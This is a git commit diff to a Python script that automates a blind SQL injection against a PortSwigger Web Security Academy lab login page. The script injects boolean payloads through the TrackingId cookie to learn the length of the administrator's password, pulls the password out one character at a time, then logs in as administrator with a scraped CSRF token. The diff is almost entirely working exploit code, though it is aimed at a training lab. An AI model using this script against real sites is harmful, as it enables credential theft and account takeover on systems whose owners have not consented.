71c24edf33b6b902141a2631d359396e95455114
Kacper <01159055@pw.edu.pl>
2022-05-26 23:59:45 +0200

    'dupa'

--- pythonProject/portSwiggerBlingSqli.py
+++ pythonProject/portSwiggerBlingSqli.py
@@ -1,24 +1,38 @@
-import string
 import requests
-
-
-url = "https://ac7e1ffe1ea1279ec06e6338004500c8.web-security-academy.net/login"
+from time import sleep
+from bs4 import BeautifulSoup
+url = "https://ac551fd21f312880c038698400010027.web-security-academy.net/login"
+s = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
 number = 1
-trackingID = "XwSsSMjdYq6boO6t\' AND (SELECT \'a\' FROM users WHERE username=\'administrator\' AND LENGTH(password)>" + str(number) + ")=\'a"
+session = requests.Session()
+response = session.get(url)
+track = session.cookies.get_dict()["TrackingId"]
+trackingID = track + "\' AND (SELECT \'a\' FROM users WHERE username=\'administrator\' AND LENGTH(password)>" + str(number) + ")=\'a"
 for a in range(1,40):
-    trackingID = "XwSsSMjdYq6boO6t\' AND (SELECT \'a\' FROM users WHERE username=\'administrator\' AND LENGTH(password)>" + str(number) + ")=\'a"
+    trackingID = track + "\' AND (SELECT \'a\' FROM users WHERE username=\'administrator\' AND LENGTH(password)>" + str(number) + ")=\'a"
     response = requests.get(url, cookies={'TrackingId': trackingID})
     if "Welcome back" in response.text:
         number += 1
-print("length of admin password found= "+str(number))
-password = []
-for num in range(1,number):
-    for letter in string.ascii_letters:
-        trackingID = "XwSsSMjdYq6boO6t\' AND (SELECT SUBSTRING(password,"+str(num)+",1) FROM users WHERE username=\'administrator\')=\'"+letter
+print("length of admin password found = "+str(number))
+password = ""
+for num in range(1,number+1):
+    for letter in s:
+        trackingID = track + "\' AND (SELECT SUBSTRING(password,"+str(num)+",1) FROM users WHERE username=\'administrator\')=\'"+letter
+        sleep(0.1)
         response = requests.get(url, cookies={'TrackingId': trackingID})
         if "Welcome back" in response.text:
             print(letter)
-            password.append(letter)
+            password += letter;
 print("admin password found: ")
-for let in password:
-    print(let)
+print(password)
+session = requests.session()
+resp1 = session.get(url).text
+soup = BeautifulSoup(resp1, "html.parser")
+csrf = soup.find('input', {'name': 'csrf'})['value']
+response = session.post(url, data={"username": "administrator", "password": password, "csrf": csrf})
+if "logout" in response.text:
+    print("challenge solved")
+else:
+    print("something does not work, incorrect data")
+    print(response.text)
+
